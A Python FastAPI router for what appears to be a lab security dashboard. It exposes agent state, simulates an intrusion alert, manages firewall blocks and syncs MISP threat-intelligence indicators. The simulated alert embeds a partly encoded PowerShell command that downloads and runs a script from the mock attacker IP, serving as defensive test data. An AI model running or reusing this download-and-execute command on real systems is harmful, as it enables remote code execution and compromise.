import os
import json
import threading
from datetime import datetime
from fastapi import APIRouter
from fastapi.responses import HTMLResponse
from web.state import STATE
from tools.firewall_tools import clear_all_pfsense_blocks, tool_unblock_firewall_ip
from core.misp_vault import get_ioc_records, add_ioc_record, fetch_open_misp_feeds

router = APIRouter()

@router.get("/api/state")
def get_state():
    return {
        "stats": STATE["stats"],
        "reasoning_stream": list(STATE["reasoning_stream"]),
        "decisions": list(STATE["decisions"])
    }

@router.post("/api/simulate")
def simulate_attack():
    from core.controller import run_agent_loop
    sample = {
        "source": "pfSense Suricata NIDS",
        "level": 10,
        "title": "ET SCAN Nmap Scripting Engine & Remote Code Execution Attempt",
        "src_ip": "192.168.63.250",
        "dest_ip": "192.168.214.10",
        "mitre": ["T1046 - Network Service Discovery", "T1059.001 - PowerShell"],
        "file_hashes": ["44d88612fea8a8f36de82e1278abb02f"],
        "encoded_payload": "cG93ZXJzaGVsbCAtZW5jIElFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnhttp://192.168.63.250/shell.ps1')"
    }
    threading.Thread(target=run_agent_loop, args=(sample,), daemon=True).start()
    return {"status": "triggered"}

@router.post("/api/clear-blocklist")
def clear_blocklist():
    success, msg = clear_all_pfsense_blocks()
    return {"success": success, "message": msg}

@router.post("/api/unblock")
def unblock_ip(payload: dict):
    ip = payload.get("ip")
    if not ip:
        return {"success": False, "message": "Thieu IP"}
    msg = tool_unblock_firewall_ip(ip)
    return {"success": True, "message": msg}

@router.get("/api/misp")
def get_misp_iocs(limit: int = 100, offset: int = 0, search: str = ""):
    records, total = get_ioc_records(limit=limit, offset=offset, search=search)
    return {
        "total": total,
        "limit": limit,
        "offset": offset,
        "iocs": records
    }

@router.post("/api/misp")
def add_misp_ioc(payload: dict):
    val = payload.get("value")
    if not val:
        return {"success": False, "message": "Thiếu giá trị indicator (value)"}
    try:
        entry = add_ioc_record(
            indicator=str(val).strip(),
            ioc_type=payload.get("type", "ip"),
            threat_name=payload.get("comment", "Lab Custom IOC"),
            source="Lab Custom",
            confidence=payload.get("threat_level", "High")
        )
        return {"success": True, "message": f"Đã thêm IOC {entry['id']}", "entry": entry}
    except Exception as e:
        return {"success": False, "message": str(e)}

@router.post("/api/misp/sync")
def sync_misp_feeds():
    """Kích hoạt tải và đồng bộ các Threat Feed công khai miễn phí chuẩn MISP/OSINT"""
    try:
        stats = fetch_open_misp_feeds()
        return {
            "success": True,
            "message": f"Đã đồng bộ thành công! Hiện có {stats['total_in_db']} IOCs trong SQLite Vault.",
            "stats": stats
        }
    except Exception as e:
        return {"success": False, "message": f"Lỗi đồng bộ feed: {str(e)}"}

@router.get("/", response_class=HTMLResponse)
def get_ui():
    html_path = os.path.join(os.path.dirname(__file__), "templates", "index.html")
    with open(html_path, "r", encoding="utf-8") as f:
        return f.read()
